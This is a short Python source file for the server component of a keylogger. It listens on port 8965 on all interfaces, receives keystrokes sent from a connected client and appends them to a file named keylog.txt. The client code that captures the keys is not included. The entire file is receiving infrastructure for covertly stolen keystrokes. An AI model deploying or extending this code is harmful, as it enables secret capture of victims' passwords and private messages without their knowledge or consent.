import socket

class Keylogger:
    def __init__(self, host, port):
        print("the server has started!")
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((host, port))
        self.server_socket.listen(1)
        self.f = open("keylog.txt", "a")
        print("Server is listening for connections...")

    def handle_client(self, client_socket):
        while True:
            try:
                button = client_socket.recv(1024).decode()
                if not button:
                    print("Client disconnected")
                    break
                print(button)
                self.log_key(button)
            except:
                print("Client connection reset")
                break

        client_socket.close()

    def log_key(self, button):
        if button == "space":
            self.f.write(" ")
        elif button == "enter":
            self.f.write("\n")
        else:
            self.f.write(button)
        self.f.flush()

    def run(self):
        while True:
            client_socket, client_address = self.server_socket.accept()
            print(f"Accepted connection from {client_address}")
            self.handle_client(client_socket)

    def stop(self):
        self.server_socket.close()
        self.f.close()

if __name__ == "__main__":
    HOST = "0.0.0.0"
    PORT = 8965
    keylogger = Keylogger(HOST, PORT)

    try:
        keylogger.run()
    except KeyboardInterrupt:
        print("Stopping server...")
        keylogger.stop()
